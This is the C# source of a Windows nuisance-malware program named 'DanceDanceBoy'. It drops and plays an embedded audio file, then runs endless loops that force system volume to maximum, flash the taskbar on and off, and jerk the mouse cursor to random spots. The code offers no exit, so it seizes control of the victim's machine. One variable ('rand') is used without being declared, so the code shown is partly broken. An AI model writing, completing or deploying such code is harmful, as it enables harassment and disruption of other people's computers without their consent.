using System;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static Windows.APIs;
using static Windows.APIs.SOUND_API;

namespace DanceDanceBoy
{
    class Win
    {
        static void Extract(string nomeDoNamespace, string caminhoDeSaida, string caminhoInterno, string nomeDoRecurso)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nomeDoNamespace + "." + (caminhoInterno == "" ? "" : caminhoInterno + ".") + nomeDoRecurso))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(caminhoDeSaida + "\\" + nomeDoRecurso, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
            {
                w.Write(r.ReadBytes((int)s.Length));
            }
        }

        [STAThread]
        static int Main()
        {

            if (!File.Exists(Path.Combine(Path.GetTempPath(), "20 ETERNAL SONGS.wav")))
            {
                Extract(typeof(Win).Namespace, Path.GetTempPath(), "Resources", "20 ETERNAL SONGS.wav");
            }

            new Thread(() => Application.Run(new DanceForm())).Start();

            new SoundPlayer(Path.Combine(Path.GetTempPath(), "20 ETERNAL SONGS.wav")).Play();

            Payloads.FlashTaskbar();

            new Thread(() => Payloads.SoundSystem()).Start();

            Thread.Sleep(5000);

            new Thread(() => Payloads.MoveCursor()).Start();
            Thread.Sleep(-1);
            return 0;
        }
    }

    class Payloads
    {
        public static void SoundSystem()
        {
            while (true)
            {
                try
                {
                    CoInitialize(IntPtr.Zero);

                    var deviceEnumerator = new MMDeviceEnumerator() as IMMDeviceEnumerator;
                    deviceEnumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out var speakers);

                    var iid = typeof(IAudioEndpointVolume).GUID;
                    speakers.Activate(ref iid, 0, IntPtr.Zero, out var endpointVolumeObj);

                    var endpointVolume = (IAudioEndpointVolume)endpointVolumeObj;

                    for (int i = 0; i < 10; i++)
                    {
                        endpointVolume.SetMasterVolumeLevelScalar(1.0f, Guid.Empty);  // MAXIMUM SOUND
                    }

                    Marshal.ReleaseComObject(endpointVolume);
                    Marshal.ReleaseComObject(speakers);
                    Marshal.ReleaseComObject(deviceEnumerator);
                    CoUninitialize();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("ERROR: " + ex);
                }
            }
        }


        public static void FlashTaskbar()
        {
            IntPtr taskbarHandle = FindWindow("Shell_TrayWnd", null);

            if (taskbarHandle != IntPtr.Zero)
            {
                new Thread(() =>
                {
                    bool visible = true;
                    while (true)
                    {
                        ShowWindow(taskbarHandle, visible ? SW_HIDE : SW_SHOW);
                        visible = !visible;
                        Thread.Sleep(500);
                    }
                })
                {
                    IsBackground = true
                }.Start();
            }
        }

        public static void MoveCursor()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                int newX = rand.Next(w);
                int newY = rand.Next(h);

                SetCursorPos(newX, newY);
                Thread.Sleep(100);
            }
        }
    }
}
